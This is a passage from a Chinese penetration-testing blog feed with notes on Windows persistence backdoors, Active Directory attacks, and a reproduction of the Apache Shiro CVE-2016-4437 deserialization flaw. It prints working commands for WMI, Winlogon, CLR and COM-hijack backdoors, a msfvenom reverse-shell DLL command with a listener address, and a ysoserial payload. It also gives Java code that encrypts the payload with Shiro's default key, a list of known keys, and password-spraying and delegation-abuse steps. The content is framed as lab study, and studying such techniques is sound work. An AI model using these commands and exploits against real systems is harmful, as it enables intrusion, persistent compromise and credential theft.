href="https://blog.csdn.net/PaidaxingSec/article/details/128929784#:~:text=1%E3%80%81SQL%20Server%20%E5%AD%98%E5%82%A8%E8%BF%87%E7%A8%8B%E6%8F%90%E6%9D%83%E6%AD%A5%E9%AA%A4%20%E4%BD%BF%E7%94%A8%20sp_addsrvrolemember%20%E5%AD%98%E5%82%A8%E8%BF%87%E7%A8%8B%E5%B0%86%E7%89%B9%E5%AE%9A%E7%9A%84%E6%95%B0%E6%8D%AE%E5%BA%93%E8%A7%92%E8%89%B2%E6%B7%BB%E5%8A%A0%E5%88%B0%E7%99%BB%E5%BD%95%E3%80%82,%E4%BD%BF%E7%94%A8%20ALTER%20PROCEDURE%20%E8%AF%AD%E5%8F%A5%E6%9B%B4%E6%94%B9%E5%AD%98%E5%82%A8%E8%BF%87%E7%A8%8B%E7%9A%84%E6%89%80%E6%9C%89%E8%80%85%E3%80%82%20%E9%80%9A%E8%BF%87%20GRANT%20%E8%AF%AD%E5%8F%A5%E5%B0%86%E6%89%A7%E8%A1%8C%E6%9D%83%E9%99%90%E6%8E%88%E4%BA%88%E7%BB%99%E7%89%B9%E5%AE%9A%E7%9A%84%E7%94%A8%E6%88%B7%E6%88%96%E8%A7%92%E8%89%B2%E3%80%82">sp_addsrvrolemember</a></li></ol><h3 id="wmi构造无文件后门"><a class="markdownIt-Anchor" href="#wmi构造无文件后门"></a> WMI构造无文件后门</h3><p>参考<a href="https://wooyun.js.org/drops/WMI%20%E7%9A%84%E6%94%BB%E5%87%BB%EF%BC%8C%E9%98%B2%E5%BE%A1%E4%B8%8E%E5%8F%96%E8%AF%81%E5%88%86%E6%9E%90%E6%8A%80%E6%9C%AF%E4%B9%8B%E6%94%BB%E5%87%BB%E7%AF%87.html">链接</a>。全称是Windows Management Instrumentation，即Windows管理规范。大多数基于Windows的软件依赖于此服务。无文件无进程使得他非常隐蔽成为后门，但由于他的隐蔽性现在被大多数杀软所查杀。可以看tasklist，隐蔽性确实不太好。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">wmic /NAMESPACE:&quot;\\root\subscription&quot; PATH __EventFilter CREATE Name=&quot;evil&quot;, EventNameSpace=&quot;root\cimv2&quot;,QueryLanguage=&quot;WQL&quot;, Query=&quot;SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA &#x27;Win32_PerfFormattedData_PerfOS_System&#x27; AND TargetInstance.SystemUpTime &gt;= 240 AND TargetInstance.SystemUpTime &lt; 310&quot;</span><br><span class="line"></span><br><span class="line">wmic /NAMESPACE:&quot;\\root\subscription&quot; PATH CommandLineEventConsumer CREATE Name=&quot;evilConsumer&quot;, ExecutablePath=&quot;C:\Users\hunter\Desktop\beacon.exe&quot;,CommandLineTemplate=&quot;C:\Users\hunter\Desktop\beacon.exe&quot;</span><br><span class="line"></span><br><span class="line">wmic /NAMESPACE:&quot;\\root\subscription&quot; PATH __FilterToConsumerBinding CREATE Filter=&quot;__EventFilter.Name=\&quot;evil\&quot;&quot;, Consumer=&quot;CommandLineEventConsumer.Name=\&quot;evilConsumer\&quot;&quot;</span><br></pre></td></tr></table></figure><p>由于WMI的事件会循环执行，为确保不会无限弹shell，可以使用系统启动时间来限制（只要触发延时可以落在限定区间即可，有些机器启动慢因此起始时间调高些）</p><h3 id="winlogon"><a class="markdownIt-Anchor" href="#winlogon"></a> Winlogon</h3><p>winlogon.exe是windows中非常重要的进程，在用户还没登录系统之前就已经存在，并与密码验证相关的重要任务精密相关。例如，当在用户登录时，Winlogon 进程负责将用户配置文件加载到注册表中：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">HKLM\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\</span><br></pre></td></tr></table></figure><p>操作1：删了后重新加载脚本</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">reg delete &quot;HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon&quot; /v Userinit /f</span><br><span class="line">reg add &quot;HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon&quot;  /v &quot;Userinit&quot; /t REG_SZ /d &quot;C:\Windows\system32\cmd.exe,&quot; /f</span><br></pre></td></tr></table></figure><p>操作2：powershell</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Set-ItemProperty &quot;HKLM:\SOFTWARE\Microsoft\WINDOWS NT\CurrentVersion\Winlogon&quot; -name   Userinit -value &quot;e:\cs.exe,C:\Windows\system32\cmd.exe&quot;</span><br></pre></td></tr></table></figure><h3 id="clr"><a class="markdownIt-Anchor" href="#clr"></a> CLR</h3><p>参考<a href="https://blog.csdn.net/qq_41874930/article/details/109530138">链接</a>。CLR可以对运行对.NET程序进行监控，CLR全称Common Language Runtime（公共语言运行库），是一个可由多种编程语言使用的运行环境。这种权限为此对方式可以理解成，让系统在执行.NET程序的时候先执行一个你指定的dll文件，<strong>且不需要管理员权限</strong>。</p><p>操作：</p><p>修改变量：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">SETX COR_ENABLE_PROFILING 1 </span><br><span class="line">SETX COR_PROFILER &#123;AABBCCDD-1234-1234-1234-AABBCCDDEEFF&#125;</span><br><span class="line">#&#123;AABBCCDD-1234-1234-1234-AABBCCDDEEFF&#125; 为 CLSID</span><br></pre></td></tr></table></figure><p>创建注册表：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">REG ADD &quot;HKEY_CURRENT_USER\Software\Classes\CLSID\&#123;AABBCCDD-1234-1234-1234-AABBCCDDEEFF&#125;\InProcServer32&quot; /VE /T REG_SZ /D &quot;C:\howe.dll&quot; /F</span><br><span class="line">REG ADD &quot;HKEY_CURRENT_USER\Software\Classes\CLSID\&#123;AABBCCDD-1234-1234-1234-AABBCCDDEEFF&#125;\InProcServer32&quot; /V ThreadingModel /T REG_SZ /D Apartment /F</span><br></pre></td></tr></table></figure><h3 id="logon-scriptswindows登录脚本"><a class="markdownIt-Anchor" href="#logon-scriptswindows登录脚本"></a> Logon Scripts（Windows登录脚本）</h3><p>当用户登录时触发，Logon Scripts能够优先于杀毒软件执行，绕过杀毒软件对敏感操作的拦截。</p><ul><li>注册表位置:<code>HKEY_CURRENT_USER\Environment\</code></li><li>创建字符串键值： <code>UserInitMprLogonScript</code>，设置后门的绝对路径：<code>e:\cs.exe</code></li></ul><p><img src="/images/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%EF%BC%88%E4%BA%8C%EF%BC%89%E2%80%94%E2%80%94%E8%A1%A5%E5%85%85%E7%89%88/image-20230807142555361.png" alt="image-20230807142555361" /></p><p>操作：</p><ol><li>上传木马</li><li>添加键值：<code>reg add HKEY_LOCAL_MACHINE\Environment /v UserInitMprLogonScript /t REG_SZ /d &quot;e:\cs.exe&quot; /f</code></li></ol><h3 id="mrupidllist"><a class="markdownIt-Anchor" href="#mrupidllist"></a> MruPidlList</h3><p>这是一种主动的后门触发方式，只要对方主机重启机器的操作，就会触发之前设置的dll。系统在启动时默认启动进程explorer.exe，如果劫持了COM对象MruPidList，就能劫持进程explorer.exe，实现后门随系统开机启动，相当于时主动后门。而劫持MruPidlList劫持注册表中的一个<code>&#123;42aedc87-2188-41fd-b9a3-0c966feabec1&#125;CLSID</code>，将其带键值换成恶意dll即可。</p><p>操作：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">SET KEY=HKEY_CURRENT_USER\Software\Classes\CLSID\&#123;42aedc87-2188-41fd-b9a3-0c966feabec1&#125;\InProcServer32</span><br><span class="line">REG.EXE ADD %KEY% /VE /T REG_SZ /D &quot;c:\calc.dll&quot; /F</span><br><span class="line">REG.EXE ADD %KEY% /V ThreadingModel /T REG_SZ /D Apartment /F</span><br></pre></td></tr></table></figure><p>木马生成：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.69.12 LPORT=4444 -f dll &gt; calc.dll</span><br></pre></td></tr></table></figure><h3 id="mof"><a class="markdownIt-Anchor" href="#mof"></a> Mof</h3><p>在windows平台下，<code>c:/windows/system32/wbem/mof/nullevt.mof</code>这个文件会每间隔一段时间（很短暂）就会以system权限执行一次，所以，只要我们将想要的操作通过代码存储到这个mof文件中，就可以实现权限提升，还有权限维持</p><p><a href="https://blog.csdn.net/Zlirving_/article/details/106618559">https://blog.csdn.net/Zlirving_/article/details/106618559</a></p><h3 id="粘滞键"><a class="markdownIt-Anchor" href="#粘滞键"></a> <a href="https://blog.csdn.net/qq_64973687/article/details/129763870?spm=1001.2014.3001.5501">粘滞键</a></h3><p>粘滞键的启动程序在C盘的Windows/system32目录下为sethc.exe。所以我们打开注册表，定位到以下路径：</p><blockquote><p>HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File ExecutionOption</p></blockquote><p>在目录中新建一个sethc.exe的子项，并添加一个新键debugger，debugger的对应键值为后门木马的路径，这里我用cmd路径代替一下。</p><p><img src="/images/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%EF%BC%88%E4%BA%8C%EF%BC%89%E2%80%94%E2%80%94%E8%A1%A5%E5%85%85%E7%89%88/image-20230807141221331.png" alt="image-20230807141221331" /></p><h3 id="参考文章"><a class="markdownIt-Anchor" href="#参考文章"></a> 参考文章</h3><ol><li><a href="https://blog.csdn.net/weixin_42282189/article/details/120770787"><strong>有实验部分，写的不错</strong></a></li><li><a href="https://www.cnblogs.com/heycomputer/articles/10666579.html">linux和windows都有</a></li><li><a href="https://xz.aliyun.com/t/8095#toc-6">也比较全</a></li><li><a href="https://cloud.tencent.com/developer/article/1850726">https://cloud.tencent.com/developer/article/1850726</a></li><li><a href="https://blog.csdn.net/CoreNote/article/details/121755723">启动项</a></li></ol><h2 id="linux权限维持"><a class="markdownIt-Anchor" href="#linux权限维持"></a> Linux权限维持</h2><h3 id="参考-2"><a class="markdownIt-Anchor" href="#参考-2"></a> 参考</h3><ol><li><a href="https://www.freebuf.com/articles/system/342468.html">基本囊括</a></li><li><a href="https://xz.aliyun.com/t/7338">很齐全</a></li></ol><h1 id="域内渗透"><a class="markdownIt-Anchor" href="#域内渗透"></a> 域内渗透</h1><h2 id="横向多平台到控制"><a class="markdownIt-Anchor" href="#横向多平台到控制"></a> 横向（多平台）到控制</h2><p>对于WIN TO WIN的方式，之前就说过，所以不多讲</p><h3 id="win-to-lin与lin-to-lin差不多"><a class="markdownIt-Anchor" href="#win-to-lin与lin-to-lin差不多"></a> WIN TO LIN（与LIN TO LIN差不多）</h3><p><a href="https://blog.csdn.net/weixin_34226706/article/details/92549303#:~:text=%E4%BD%BF%E7%94%A8%E8%BF%99%E4%B8%AA%E5%B0%8F%E7%A8%8B%E5%BA%8F%EF%BC%8C%E5%8F%AF%E4%BB%A5%E8%AE%A9%E4%BD%A0%E5%9C%A8windows%E7%9A%84cmd%E7%AA%97%E5%8F%A3%E4%B8%8B%E8%BF%9E%E6%8E%A5%E5%88%B0linux%EF%BC%8C%E5%B0%B1%E5%83%8Fssh%E4%BC%BC%E7%9A%84%E3%80%82%20%E4%B8%8D%E8%BF%87%E6%98%BE%E7%A4%BA%E8%B2%8C%E4%BC%BC%E6%9C%89%E7%82%B9%E9%97%AE%E9%A2%98%EF%BC%8C%E5%A4%AA%E4%B9%B1%E4%BA%86%E3%80%82%20%E4%BD%A0%E5%8F%AF%E4%BB%A5%E8%BF%99%E6%A0%B7%E4%BD%BF%E7%94%A8%EF%BC%9A%201.%20%E9%A6%96%E5%85%88%E6%8A%8Aplink.exe%20%E6%94%BE%E5%88%B0C%3AWindows%20%E7%9B%AE%E5%BD%95%E4%B8%8B%EF%BC%9B,2.%20%E5%9C%A8cmd%E7%AA%97%E5%8F%A3%E4%B8%AD%E8%BE%93%E5%85%A5%EF%BC%9A%20plink%20-l%20root%20IP%20%E8%BF%99%E6%A0%B7%E5%B0%B1%E5%8F%AF%E4%BB%A5%E7%99%BB%E5%BD%95%E8%BF%9C%E7%A8%8B%E6%9C%BA%E5%99%A8%E4%BA%86%E3%80%82">plink</a> 或者 基于Windows SSH库自行开发各种远程执行小工具。</p><h3 id="lin-to-win"><a class="markdownIt-Anchor" href="#lin-to-win"></a> LIN TO WIN</h3><p>一般都会将 impacket套件中的各个常用py脚本事先直接打包成可执行文件，然后丢到目标linux系统中去执行，如下。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">wmiexec_linux_x86_64</span><br><span class="line">smbexec_linux_x86_64</span><br><span class="line">psexec_linux_x86_64</span><br><span class="line">atexec_linux_x86_64</span><br><span class="line">dcomexec_linux_x86_64</span><br></pre></td></tr></table></figure><p>另外,还有一些基于go的工具,同样也可以编译成可执行文件之后再丢上去执行</p><h1 id="域控"><a class="markdownIt-Anchor" href="#域控"></a> 域控</h1><h2 id="获取域控权限"><a class="markdownIt-Anchor" href="#获取域控权限"></a> 获取域控权限</h2><h3 id="kerberos委派机制"><a class="markdownIt-Anchor" href="#kerberos委派机制"></a> Kerberos委派机制</h3><p>域委派是指将域内用户的权限委派给服务账号，使得服务账号能以用户的权限在域内展开活动。其包含：</p><ul><li>约束委派</li><li>非约束委派</li><li>基于资源的约束委派</li></ul><p>参考：<a href="https://cloud.tencent.com/developer/article/1899592">https://cloud.tencent.com/developer/article/1899592</a></p><p>注：</p><ol><li>在 Windows 系统中，只有服务账号和主机账号的属性才有委派功能，普通用户默认是没有的</li><li></li></ol><h4 id="非约束委派"><a class="markdownIt-Anchor" href="#非约束委派"></a> 非约束委派</h4><p>简单点说就是：用户 A 去访问服务B，服务 B 的服务账户开启了非约束委派，那么当用户 A 访问服务 B 的时候会将用户 A 的 TGT 发送给服务 B 并保存进内存，服务 B 能够利用用户 A 的身份去访问用户 A 能够访问的任意服务。其中，用户A的票据会被存在服务B中</p><img src="/images/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%EF%BC%88%E4%BA%8C%EF%BC%89%E2%80%94%E2%80%94%E8%A1%A5%E5%85%85%E7%89%88/4354ae02457d7d38ffbc01547a2005a1.jpeg" alt="img" style="zoom:67%;" /><p>攻击手法：</p><p>发现域内主机主机我一般是使用 <code>LDAP</code>，可以使用如下方式：<a href="https://www.softpedia.com/get/Programming/Other-Programming-Files/AdFind.shtml">Adfind</a>工具，命令如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">AdFind.exe -b &quot;DC=redteam,DC=com&quot; -f &quot;(&amp;(samAccountType=805306368)(userAccountControl:1.2.840.113556.1.4.803:=524288))&quot; cn distinguishedName</span><br></pre></td></tr></table></figure><img src="/images/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%EF%BC%88%E4%BA%8C%EF%BC%89%E2%80%94%E2%80%94%E8%A1%A5%E5%85%85%E7%89%88/ccb1b9a6ca972b231f899c4bfc20694a.png" alt="img" style="zoom:50%;" /><p>saulgoodman就是非约束委派用户。知道委派用户之后，我们尝试请求Service1（拥有委派的用户）。一旦域控访问了该服务（可以使用<code>Enter-PSSession -ComputerName WIN-BING-PC</code>模拟访问），则我们可以使用mimikatz dump下其数据库，此时域控的票据就在里面了，我们就可以通过ptt，获得域控权限。</p><h4 id="约束委派"><a class="markdownIt-Anchor" href="#约束委派"></a> 约束委派</h4><p>约束委派（Constrained Delegation）即 Kerberos 的扩展协议 S4U2Proxy，服务账号只能获取某用户的 TGS ，从而只能模拟用户访问特定的服务，这也相对应非约束委派更安全一些。</p><p>在内网中利用约束委派进行攻击的最重要的一点是：<strong>约束委派的服务代表用户获得针对服务自身的kerberos票据这个过程，服务是不需要用户的凭据的</strong>，通过这个点，只要我们有约束委派的服务的账户和密码，那么通过这个服务就可以直接来进行攻击可以访问的相关服务。</p><img src="/images/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%EF%BC%88%E4%BA%8C%EF%BC%89%E2%80%94%E2%80%94%E8%A1%A5%E5%85%85%E7%89%88/b012828c3eceb6b299a9f9e7f12adde1.png" alt="img" style="zoom:40%;" /><p>其攻击方式有两种：</p><ul><li>基于主机账号的</li><li>基于服务账号的</li><li>参考：<a href="https://www.cnblogs.com/zpchcbd/p/12939246.html%E3%80%81https://zhuanlan.zhihu.com/p/476094695%E3%80%81https://xz.aliyun.com/t/7217">https://www.cnblogs.com/zpchcbd/p/12939246.html、https://zhuanlan.zhihu.com/p/476094695、https://xz.aliyun.com/t/7217</a></li></ul><h3 id="gpp目录账号密码"><a class="markdownIt-Anchor" href="#gpp目录账号密码"></a> GPP目录账号密码</h3><p>搜集GPP目录，其中可能保存的有域账号密码，不仅仅是存在XML里的那些，NETLOGON目录中的某些脚本同样也可能保存有账号密码。</p><h3 id="批量对域用户进行单密码尝试-喷射利用adsi接口日志id-4771"><a class="markdownIt-Anchor" href="#批量对域用户进行单密码尝试-喷射利用adsi接口日志id-4771"></a> 批量对域用户进行单密码尝试 [ 喷射,利用ADSI接口,日志id 4771 ]</h3><ol><li>喷射：工具<a href="https://github.com/dafthack/DomainPasswordSpray">https://github.com/dafthack/DomainPasswordSpray</a></li><li>ADSI接口</li><li>日志id 4771</li></ol><h3 id="基础服务getshell"><a class="markdownIt-Anchor" href="#基础服务getshell"></a> 基础服务getshell</h3><ol><li>弱口令</li><li>各类java中间件和已知Nday漏洞</li><li>常规web漏洞</li><li>凭证抓取，横向移动<ol><li>域管密码</li><li>域管令牌</li></ol></li></ol><h3 id="爆破ldapkerberos"><a class="markdownIt-Anchor" href="#爆破ldapkerberos"></a> 爆破LDAP&amp;Kerberos</h3><p>域内LDAP是用来访问Acitve Directory数据库的目录服务协议。AD DS域服务通过使用LDAP名称路径表示对象在Active Directory数据库中的位置。管理员使用LDAP协议来访问活动目录中的对象，LDAP通过“命令路径”定位对象在数据库中的位置，即使用标识名（Distinguished Name,DN）和相对标识名（Relative Distinguished Name,RDN）标识对象。</p><p>爆破工具：<a href="https://github.com/optiv/Talon">https://github.com/optiv/Talon</a></p><p>Exchange特定ACL滥用</p><p>SSP 截获关键服务器登录密码</p><p>DNSAdmin 组成员滥用 [ 加载执行恶意dll ]</p><p>LAPS</p><p>MS14-068 [ 如今实际中已很少遇到了 ]</p><p>LLMNR/NBNS欺骗  + SMB relay [ 真实实战中其实用的并不多 ]</p><h1 id="常用工具"><a class="markdownIt-Anchor" href="#常用工具"></a> 常用工具</h1>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;概述&quot;&gt;&lt;a class=&quot;markdownIt-Anchor&quot; href=&quot;#概述&quot;&gt;&lt;/a&gt; 概述&lt;/h1&gt;
&lt;p&gt;鉴于之前的内网安全这篇文章所述内容与实战相差还是有点大，没有很清晰的思路或者更加常用的方法来进行内网渗透，这里将结合之前的部分知识，拓展内网渗透</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>tomcat复现</title>
    <link href="https://j3f5.github.io/articles/2023/07/20/tomcat%E5%A4%8D%E7%8E%B0/"/>
    <id>https://j3f5.github.io/articles/2023/07/20/tomcat%E5%A4%8D%E7%8E%B0/</id>
    <published>2023-07-20T13:01:39.000Z</published>
    <updated>2023-07-20T13:01:39.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="文件包含漏洞"><a class="markdownIt-Anchor" href="#文件包含漏洞"></a> 文件包含漏洞</h1><p>由于 Tomcat AJP 协议设计上存在缺陷，攻击者通过 Tomcat AJP Connector 可以读取或包含 Tomcat 上所有 webapp 目录下的任意文件，例如可以读取 webapp 配置文件或源代码。此外在目标应用有文件上传功能的情况下，配合文件包含的利用还可以达到远程代码执行的危害。</p><p><img src="/images/tomcat%E5%A4%8D%E7%8E%B0/image-20230720214732443.png" alt="image-20230720214732443" /></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;文件包含漏洞&quot;&gt;&lt;a class=&quot;markdownIt-Anchor&quot; href=&quot;#文件包含漏洞&quot;&gt;&lt;/a&gt; 文件包含漏洞&lt;/h1&gt;
&lt;p&gt;由于 Tomcat AJP 协议设计上存在缺陷，攻击者通过 Tomcat AJP Connector 可以读取或包含 T</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>shiro复现</title>
    <link href="https://j3f5.github.io/articles/2023/07/20/shiro%E5%A4%8D%E7%8E%B0/"/>
    <id>https://j3f5.github.io/articles/2023/07/20/shiro%E5%A4%8D%E7%8E%B0/</id>
    <published>2023-07-20T01:40:10.000Z</published>
    <updated>2023-07-20T01:40:10.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="背景"><a class="markdownIt-Anchor" href="#背景"></a> 背景</h1><p><strong>漏洞编号：</strong> CVE-2016-4437</p><p>Apache Shiro框架提供了记住密码的功能（RememberMe），默认使用了CookieRememberMeManager，加密的用户信息序列化后存储在名为<code>rememberMe</code> 的Cookie 中。导致可以利用 Shiro 的默认密钥伪造用户 Cookie ，触发 Java 反序列化漏洞，导致可以在目标机器上执行任意命令。实质上是一个<strong>反序列化漏洞</strong>。</p><p><strong>影响版本：</strong></p><p>Apache Shiro &lt;= 1.2.4</p><p><strong>漏洞特征：</strong></p><p>返回包中包含rememberMe=deleteMe字段。</p><h2 id="流程"><a class="markdownIt-Anchor" href="#流程"></a> 流程</h2><p>在Shiro框架下，用户登陆成功后会生成一个经过加密的Cookie。其Cookie的Key的值为RememberMe，Value的值是经过<strong>序列化</strong>、<strong>AES加密</strong>和<strong>Base64编码</strong>后得到的结果。</p><p>服务端在接收到一个Cookie时，会按照如下步骤进行解析处理：</p><p>1.检索RememberMe Cookie的值</p><p>2.进行Base64解码</p><p>3.进行AES解码</p><p>4.进行反序列化操作</p><p>在第4步中的调用反序列化时未进行任何过滤，进而可以导致触发远程代码执行漏洞。</p><p>由于使用了AES加密，成功利用该漏洞需要获取AES的加密密钥，<strong>在Shiro1.2.4版本之前AES的加密密钥为硬编码</strong>，其默认密钥的Base64编码后的值为<code>kPH+bIxk5D2deZiIxcaaaA==</code>，于是就可得到Payload的构造流程：</p><pre><code>恶意命令--&gt;序列化--&gt;AES加密--&gt;base64编码--&gt;发送Cookie</code></pre><p>目前官方通过去掉硬编码的密钥每次生成一个密钥来解决其漏洞，但可以通过搜索引擎等方式收集到不同的密钥，提高对该漏洞的利用成功。</p><p>Q1：这个AES的密钥是啥：默认密钥的Base64编码后的值为<code>kPH+bIxk5D2deZiIxcaaaA==</code></p><p>Q2：漏洞特征是啥？</p><blockquote><p>header=“rememberme=deleteMe”</p><p>header=“shiroCookie”</p></blockquote><h2 id="工具"><a class="markdownIt-Anchor" href="#工具"></a> 工具</h2><p><a href="https://github.com/fupinglee/ShiroScan">https://github.com/fupinglee/ShiroScan</a></p><p><a href="https://github.com/sv3nbeast/ShiroScan">https://github.com/sv3nbeast/ShiroScan</a></p><p><a href="https://github.com/insightglacier/Shiro_exploit">https://github.com/insightglacier/Shiro_exploit</a></p><p><a href="https://github.com/Ares-X/shiro-exploit">https://github.com/Ares-X/shiro-exploit</a></p><p><a href="https://github.com/j1anFen/shiro_attack/releases/tag/2.2">https://github.com/j1anFen/shiro_attack/releases/tag/2.2</a></p><h2 id="修复方案"><a class="markdownIt-Anchor" href="#修复方案"></a> 修复方案</h2><ul><li>升级Shiro至新版本；</li><li>更改默认密钥；</li></ul><h1 id="复现"><a class="markdownIt-Anchor" href="#复现"></a> 复现</h1><h2 id="手工"><a class="markdownIt-Anchor" href="#手工"></a> 手工</h2><p>登录框有：</p><p>抓包看一下，发现特征 rememberMe=deleteMe，判断其使用了CookieRememberMeManager，并且可能存在漏洞。：</p><p><img src="/images/shiro%E5%A4%8D%E7%8E%B0/image-20230720104352684.png" alt="image-20230720104352684" /></p><p>利用：生成poc（使用<code>java -jar ysoserial-master-30099844c6-1.jar CommonsBeanutils1 &quot;touch /tmp/success&quot; &gt; poc.ser</code>）</p><p>然后将以下代码放到shiro环境中，生成cookie</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.vulhub.shirodemo;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.shiro.crypto.AesCipherService;</span><br><span class="line"><span class="keyword">import</span> org.apache.shiro.codec.CodecSupport;</span><br><span class="line"><span class="keyword">import</span> org.apache.shiro.util.ByteSource;</span><br><span class="line"><span class="keyword">import</span> org.apache.shiro.codec.Base64;</span><br><span class="line"><span class="keyword">import</span> org.apache.shiro.io.DefaultSerializer;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.nio.file.FileSystems;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Files;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Paths;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TestRemember</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">byte</span>[] payloads = Files.readAllBytes(FileSystems.getDefault().getPath(<span class="string">&quot;/home/j3fffff/Mywork/Tools/Java&quot;</span>, <span class="string">&quot;poc.ser&quot;</span>));</span><br><span class="line"></span><br><span class="line">        <span class="type">AesCipherService</span> <span class="variable">aes</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">AesCipherService</span>();</span><br><span class="line">        <span class="type">byte</span>[] key = Base64.decode(CodecSupport.toBytes(<span class="string">&quot;kPH+bIxk5D2deZiIxcaaaA==&quot;</span>));</span><br><span class="line"></span><br><span class="line">        <span class="type">ByteSource</span> <span class="variable">ciphertext</span> <span class="operator">=</span> aes.encrypt(payloads, key);</span><br><span class="line">        System.out.printf(ciphertext.toString());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>将生成的payload放在cookie中进行发送即可执行。因为没有shiro环境，遂罢，使用工具攻击</p><h2 id="工具-2"><a class="markdownIt-Anchor" href="#工具-2"></a> 工具</h2><p><img src="/images/shiro%E5%A4%8D%E7%8E%B0/image-20230720111310199.png" alt="image-20230720111310199" /></p><p>注意URL必须填上login的界面，出现rememberme才算。对于密钥的爆破，现在有搜集到：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">kPH+bIxk5D2deZiIxcaaaA==</span><br><span class="line">wGiHplamyXlVB11UXWol8g==</span><br><span class="line">2AvVhdsgUs0FSA3SDFAdag==</span><br><span class="line">4AvVhmFLUs0KTA3Kprsdag==</span><br><span class="line">3AvVhmFLUs0KTA3Kprsdag==</span><br><span class="line">Z3VucwAAAAAAAAAAAAAAAA==</span><br><span class="line">U3ByaW5nQmxhZGUAAAAAAA==</span><br><span class="line">wGiHplamyXlVB11UXWol8g==</span><br><span class="line">6ZmI6I2j5Y+R5aSn5ZOlAA==</span><br></pre></td></tr></table></figure><p>注入内存马：</p><p><img src="/images/shiro%E5%A4%8D%E7%8E%B0/image-20230720112032367.png" alt="image-20230720112032367" /></p><p>然后连冰蝎：</p><p><img src="/images/shiro%E5%A4%8D%E7%8E%B0/image-20230720111927629.png" alt="image-20230720111927629" /></p><p><img src="/images/shiro%E5%A4%8D%E7%8E%B0/image-20230720111958199.png" alt="image-20230720111958199" /></p><h1 id="其他"><a class="markdownIt-Anchor" href="#其他"></a> 其他</h1><h2 id="shiro550-与-shiro721的区别"><a class="markdownIt-Anchor" href="#shiro550-与-shiro721的区别"></a> shiro550 与 shiro721的区别</h2><p><strong>Shiro550 反序列化漏洞原理：</strong></p><p>记住我的功能开启之后，会有Cookie 数据，Cookie 数据其实就是加密后的经过序列化的用户对象，也就是二进制字节流。</p><p>加密算法是AES 算法，算法很安全，但是秘钥是固定的，并且存储于源码中。</p><p><strong>Shiro721 利用条件：</strong></p><p>AES 秘钥不在是固定的了，但是此秘钥可以被爆破</p><p>需要提供一个合法用户，再点击remmber me ，成功登录之后，获取Cookie remmber-me 的值。</p><p><strong>区别在于：</strong></p><p>Shiro-550，Apache Shiro框架提供了记住密码的功能（RememberMe），用户登录成功后会生成经过加密并编码的cookie。在服务端对rememberMe的cookie值，先base64解码然后AES解密再反序列化，就导致了反序列化RCE漏洞。Shiro-721，由于Apache Shiro cookie中通过 